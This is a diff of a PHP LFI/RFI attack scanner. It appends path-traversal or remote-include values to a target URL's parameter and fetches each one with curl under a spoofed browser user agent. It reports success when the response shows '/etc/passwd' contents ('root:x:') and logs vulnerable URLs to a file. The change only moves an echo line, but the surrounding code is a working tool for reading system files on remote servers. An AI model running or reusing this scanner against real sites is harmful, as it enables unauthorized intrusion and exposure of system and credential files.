@@ -53,7 +53,6 @@ foreach(array_keys($opts) as $opt) switch($opt) {
 	  $xpt = substr($dominio, 0, $valor);
 	  foreach($passwd as $passwd1) {
 	  $domain = $xpt.$passwd1;
-	  echo $domain."=>";
 	  post($domain);
 	  }
 	  break;
@@ -66,7 +65,6 @@ foreach(array_keys($opts) as $opt) switch($opt) {
 	  $xpt = substr($dominio, 0, $valor);
 	  foreach($passwd as $passwd1) {
           $domain = $xpt.$passwd1;
-	  echo $domain."=>";
 	  for($i=0; $i <=$tr=count($domain)-1; $i++) {
 	      post($domain);
 	         }
@@ -79,7 +77,6 @@ foreach(array_keys($opts) as $opt) switch($opt) {
 	  $valor = strpos($dominio, "=");
 	  $xpt = substr($dominio, 0, $valor);
 	  $domain = $xpt."=".$rfi;
-	  echo $domain."=>";
 	  post($domain);
 	  break;
 
@@ -89,12 +86,11 @@ foreach(array_keys($opts) as $opt) switch($opt) {
 	  $valor = strpos($dominio, "=");
           $xpt = substr($dominio, 0, $valor);
  	  $domain = $xpt. "=".$rfi;
-	  echo $domain."=>";
 	  for($i=0; $i <=$tr=count($domain)-1; $i++) {
           post($domain);
                          }
                 }
-         }
+           }
 
     function post($domain) {
     if(preg_match("@http://@", $domain)){
@@ -110,6 +106,7 @@ foreach(array_keys($opts) as $opt) switch($opt) {
     curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (X11; Linux x86_64; rv:24.0) Gecko/20140722 Firefox/24.0 Iceweasel/24.7.0");
     $exec = curl_exec($ch);
     curl_close($ch);
+    echo $domain."=>";
     if(preg_match_all("@root:x:@", $exec) || preg_match_all("@uname@", $exec) ) {
     	echo "Found\n\n";
     	file_put_contents("lfi-rfi.txt", $domain."\r\n", FILE_APPEND);
